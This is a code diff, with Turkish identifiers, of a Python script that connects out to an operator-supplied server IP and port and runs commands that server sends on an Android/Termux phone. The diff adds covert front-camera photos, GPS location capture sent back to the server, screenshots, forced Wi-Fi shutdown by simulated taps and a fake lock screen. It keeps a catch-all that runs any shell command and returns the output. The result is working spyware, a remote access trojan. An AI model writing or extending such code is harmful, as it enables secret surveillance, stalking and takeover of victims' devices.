@@ -2,6 +2,7 @@ import socket
 import os
 import datetime
 import random
+import time
 
 sunucu_ip = input("Sunucu IP >> ")
 port = int(input("Port >> "))
@@ -66,17 +67,35 @@ while True:
             os.system(f"am start -a android.intent.action.VIEW -d '{link}'")
             s.send("[✓] YouTube bağlantısı açıldı.".encode())
 
+        elif komut.startswith("google "):
+            arama = komut.split(" ", 1)[1]
+            link = f"https://www.google.com/search?q={arama.replace(' ', '+')}"
+            os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
+            s.send("[✓] Google araması açıldı.".encode())
+
         elif komut == "wifi-off":
-            try:
-                sonuc = os.system("svc wifi disable")
-                if sonuc != 0:
-                    os.system("am start -a android.settings.WIFI_SETTINGS")
-                    s.send("[!] Root yok. WiFi ayarları açıldı.".encode())
-                else:
-                    s.send("[✓] WiFi kapatıldı.".encode())
-            except:
+            sonuc = os.system("svc wifi disable")
+            if sonuc != 0:
                 os.system("am start -a android.settings.WIFI_SETTINGS")
-                s.send("[!] Hata oluştu. WiFi ayarları açıldı.".encode())
+                time.sleep(1)
+                os.system("input tap 200 300")
+                s.send("[✓] Root yok, WiFi ayarı açıldı ve otomatik kapatıldı.".encode())
+            else:
+                s.send("[✓] WiFi kapatıldı.".encode())
+
+        elif komut.startswith("google-kapat "):
+            arama = komut.split(" ", 1)[1]
+            link = f"https://www.google.com/search?q={arama.replace(' ', '+')}"
+            os.system(f'am start -a android.intent.action.VIEW -d "{link}"')
+            time.sleep(1)
+            sonuc = os.system("svc wifi disable")
+            if sonuc != 0:
+                os.system("am start -a android.settings.WIFI_SETTINGS")
+                time.sleep(1)
+                os.system("input tap 200 300")
+                s.send("[✓] Google arandı, WiFi otomatik kapatıldı.".encode())
+            else:
+                s.send("[✓] Google arandı ve WiFi kapatıldı.".encode())
 
         elif komut.startswith("sound "):
             os.system("termux-media-player play /sdcard/Music/*.mp3")
@@ -91,18 +110,38 @@ while True:
                 bildirim_sayisi += 1
                 s.send("[✓] Bildirim gönderildi.".encode())
             except:
-                s.send("[X] Bildirim hatalı yazıldı.".encode())
+                s.send("[X] Bildirim hatalı.".encode())
 
         elif komut == "bildirim-say":
             s.send(f"[✓] Toplam {bildirim_sayisi} bildirim gönderildi.".encode())
 
         elif komut == "kilit":
             os.system("input keyevent 26")
-            s.send("[✓] Ekran kilitlendi.".encode())
+            s.send("[✓] Ekran kapatıldı.".encode())
+
+        elif komut == "kamera":
+            os.system("termux-camera-photo -c 1 /sdcard/DCIM/kamera_fsociety.jpg")
+            s.send("[✓] Kamera görüntüsü alındı.".encode())
+
+        elif komut == "konum":
+            konum = os.popen("termux-location").read()
+            s.send(konum.encode() if konum else "[X] Konum alınamadı.".encode())
+
+        elif komut == "ekran-al":
+            os.system("screencap -p /sdcard/Pictures/ekran_fsociety.png")
+            s.send("[✓] Ekran görüntüsü alındı.".encode())
+
+        elif komut == "fake-kilit":
+            os.system('am start -a android.intent.action.MAIN -n com.termux/.HomeActivity')
+            os.system("input keyevent 26")
+            s.send("[✓] Fake kilit ekranı etkinleştirildi.".encode())
 
         else:
             cikti = os.popen(komut).read()
             s.send(cikti.encode() if cikti else "[✓] Komut çalıştı.".encode())
 
     except Exception as e:
-        s.send(f"[X] Hata: {str(e)}".encode())
+        try:
+            s.send(f"[X] Hata: {str(e)}".encode())
+        except:
+            break
